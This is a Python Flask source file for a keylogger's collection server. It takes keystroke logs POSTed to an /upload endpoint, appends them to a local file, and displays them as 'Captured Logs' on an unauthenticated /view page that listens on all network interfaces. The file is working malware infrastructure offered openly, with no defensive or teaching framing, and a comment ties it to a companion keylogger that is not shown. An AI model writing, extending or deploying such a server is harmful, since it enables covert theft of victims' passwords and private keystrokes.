from flask import Flask, request
from markupsafe import Markup
import os

app = Flask(__name__)

# Absolute path for log file (same as keylogger)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("")

@app.route("/")
def home():
    return """
    <h2>Keylogger server is running ✅</h2>
    <p>POST keystrokes to <code>/upload</code>.<br>
    View logs at <a href='/view'>/view</a>.</p>
    """

@app.route("/upload", methods=["POST"])
def upload():
    data = request.json.get("log")
    if data:
        with open(LOG_FILE, "a") as f:
            f.write(data)
    return {"status": "ok"}

@app.route("/view")
def view_logs():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
        return f"""
        <html>
        <head>
            <title>Captured Logs</title>
            <style>
                body {{ font-family: monospace; background: #f4f4f4; padding: 20px; }}
                pre {{
                    background: white;
                    padding: 15px;
                    border-radius: 8px;
                    box-shadow: 0 0 5px #ccc;
                    white-space: pre-wrap;
                    word-wrap: break-word;
                }}
            </style>
        </head>
        <body>
            <h2>Captured Logs</h2>
            <pre>{Markup.escape(content)}</pre>
        </body>
        </html>
        """
    except FileNotFoundError:
        return "<h2>No logs yet!</h2>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

